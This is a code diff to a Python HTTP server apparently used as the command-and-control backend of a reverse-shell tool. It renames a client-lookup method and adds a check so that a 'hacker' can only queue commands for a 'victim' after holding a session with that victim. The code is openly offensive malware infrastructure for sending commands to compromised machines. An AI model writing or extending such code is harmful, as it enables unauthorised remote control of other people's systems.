@@ -74,7 +74,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         self.c_send_error(HTTPStatus.UNAUTHORIZED)
         return False
 
-    def get_client_type(self, client_id: str):
+    def get_client_type_from_db(self, client_id: str):
         """Get the client type of a specified client from the database. This could also be a means to check if the client
         has verified itself."""
         # query data from the database
@@ -234,12 +234,26 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # because if the victim doesn't exist, there is no point in adding the data in the db.
         # We can use the self.get_client_type method for that
         if (
-            self.get_client_type(victim_id) is None
-            or self.get_client_type(victim_id) != ut.ClientType.Victim
+            self.get_client_type_from_db(victim_id) is None
+            or self.get_client_type_from_db(victim_id) != ut.ClientType.Victim
         ):
             return bad_request
 
-        # If we get the values then let's insert them into the database.
+        # Now let's check if the user is already in a session, but not with us
+        # if that's the case, we can't write the command in the db, or even if the
+        # user is not in a session at all, the hacker first should establish a session
+        # with the victim then, insert the command in.
+
+        if (
+            self.config.hacking_sessions.get(victim_id, None) is None
+            or self.config.hacking_sessions.get(victim_id, None) != client_id
+        ):
+            # The victim is not even in session or it is in one, but
+            # not with this hacker. So let's return an error
+            return (False, HTTPStatus.FORBIDDEN)
+
+        # If we are in session with the victim and satisfy all the other requirements
+        # we can proceed by inserting the command in the database.
         result = self.config.execute_on_session_db(
             "INSERT INTO commands VALUES(?, ?, ?)", [command_id, victim_id, command]
         )
@@ -264,7 +278,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Let's check if the victim is valid by using the self.get_client_type function
         valid_victim = (
-            victim_type := self.get_client_type(victim_id)
+            victim_type := self.get_client_type_from_db(victim_id)
         ) is not None and victim_type == ut.ClientType.Victim
 
         # If the victim is invalid, send a bad request for the user
@@ -324,7 +338,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         else:
             # Ok so first let's get the client-type from the database and
             # use that to check if the user can access the path it's accessing
-            client_type = self.get_client_type(client_id)
+            client_type = self.get_client_type_from_db(client_id)
 
             # if the client_type is None it means there is no client
             # with the client_id we gave so let's tell the user that
